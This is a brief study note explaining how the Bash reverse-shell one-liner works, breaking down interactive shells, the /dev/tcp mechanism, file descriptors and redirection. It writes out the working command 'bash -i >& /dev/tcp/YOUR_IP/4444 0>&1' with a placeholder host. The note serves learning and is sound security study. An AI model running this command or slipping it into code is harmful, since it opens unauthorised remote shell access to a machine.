### Bash Networking / File Descriptors

- Studied the Bash reverse-shell one-liner:

  `bash -i >& /dev/tcp/YOUR_IP/4444 0>&1`

- Understood:
  - `bash -i` → starts an interactive Bash shell.
  - `/dev/tcp/HOST/PORT` → Bash's special TCP connection mechanism.
  - File descriptor `0` → stdin.
  - File descriptor `1` → stdout.
  - File descriptor `2` → stderr.
  - `>&` → redirects stdout and stderr.
  - `0>&1` → connects stdin to the same destination as stdout.
- Understood the basic concept of a reverse shell: the target machine initiates a connection outward and the shell's input/output is carried over that connection.
